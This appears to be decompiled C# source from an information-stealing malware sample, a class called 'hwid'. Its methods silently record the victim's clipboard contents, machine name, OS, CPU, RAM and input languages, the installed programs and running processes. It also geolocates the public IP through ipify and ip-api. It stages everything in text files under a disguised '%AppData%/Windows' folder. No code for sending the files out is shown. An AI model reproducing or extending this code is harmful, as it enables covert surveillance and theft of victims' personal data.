using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using System.Xml;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace hw1d
{
	// Token: 0x0200000B RID: 11
	internal class hwid
	{
		// Token: 0x06000013 RID: 19 RVA: 0x00002F10 File Offset: 0x00001110
		public static string GetHWID()
		{
			string result;
			try
			{
				Size size = Screen.PrimaryScreen.Bounds.Size;
				try
				{
					using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows\\Hardware.txt", false, Encoding.Default))
					{
						int num = 0;
						foreach (object obj in InputLanguage.InstalledInputLanguages)
						{
							InputLanguage inputLanguage = (InputLanguage)obj;
							num++;
							bool flag = num <= 1;
							if (flag)
							{
								streamWriter.Write("Languages : " + inputLanguage.Culture.EnglishName);
							}
							else
							{
								streamWriter.WriteLine("\t" + inputLanguage.Culture.EnglishName);
							}
						}
						TextWriter textWriter = streamWriter;
						string str = "OC verison - ";
						OperatingSystem osversion = Environment.OSVersion;
						textWriter.WriteLine(str + ((osversion != null) ? osversion.ToString() : null));
						streamWriter.WriteLine("MachineName - " + Environment.MachineName);
						RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Hardware\\Description\\System\\CentralProcessor\\0", RegistryKeyPermissionCheck.ReadSubTree);
						bool flag2 = registryKey != null;
						if (flag2)
						{
							bool flag3 = registryKey.GetValue("ProcessorNameString") != null;
							if (flag3)
							{
								TextWriter textWriter2 = streamWriter;
								string str2 = "CPU - ";
								object value = registryKey.GetValue("ProcessorNameString");
								textWriter2.WriteLine(str2 + ((value != null) ? value.ToString() : null));
							}
						}
						TextWriter textWriter3 = streamWriter;
						string str3 = "Resolution - ";
						Size size2 = size;
						textWriter3.WriteLine(str3 + size2.ToString());
						streamWriter.WriteLine("Current time Utc - " + DateTime.UtcNow.ToString());
						streamWriter.WriteLine("Current time - " + DateTime.Now.ToString());
						ComputerInfo computerInfo = new ComputerInfo();
						streamWriter.WriteLine("OS Full name - " + computerInfo.OSFullName);
						streamWriter.WriteLine("RAM - " + computerInfo.TotalPhysicalMemory.ToString());
						string str4 = new WebClient().DownloadString("https://api.ipify.org");
						streamWriter.WriteLine("Clipboard - " + hwid.clipboard());
						streamWriter.WriteLine("IP - " + str4);
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.LoadXml(new WebClient().DownloadString("http://ip-api.com/xml"));
						streamWriter.WriteLine("Country - " + xmlDocument.GetElementsByTagName("country")[0].InnerText);
						streamWriter.WriteLine("Country Code - " + xmlDocument.GetElementsByTagName("countryCode")[0].InnerText);
						streamWriter.WriteLine("Region - " + xmlDocument.GetElementsByTagName("region")[0].InnerText);
						streamWriter.WriteLine("Region Name - " + xmlDocument.GetElementsByTagName("regionName")[0].InnerText);
						streamWriter.WriteLine("City - " + xmlDocument.GetElementsByTagName("city")[0].InnerText);
						streamWriter.WriteLine("Zip - " + xmlDocument.GetElementsByTagName("zip")[0].InnerText);
						streamWriter.Close();
						result = computerInfo.OSFullName;
					}
				}
				catch
				{
					result = null;
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000032F4 File Offset: 0x000014F4
		public static void getprogrammes()
		{
			using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows\\Prgrm.txt", false, Encoding.Default))
			{
				try
				{
					RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
					string[] subKeyNames = registryKey.GetSubKeyNames();
					for (int i = 0; i < subKeyNames.Length; i++)
					{
						RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
						string text = registryKey2.GetValue("DisplayName") as string;
						bool flag = text == null;
						if (!flag)
						{
							streamWriter.WriteLine(text);
						}
					}
				}
				catch
				{
				}
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000033B8 File Offset: 0x000015B8
		public static void getprocesses()
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "/Windows\\Misc.txt", false, Encoding.Default))
				{
					Process[] processes = Process.GetProcesses();
					for (int i = 0; i < processes.Length; i++)
					{
						streamWriter.WriteLine(processes[i].ProcessName.ToString());
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00003448 File Offset: 0x00001648
		public static string clipboard()
		{
			return Clipboard.GetText();
		}
	}
}
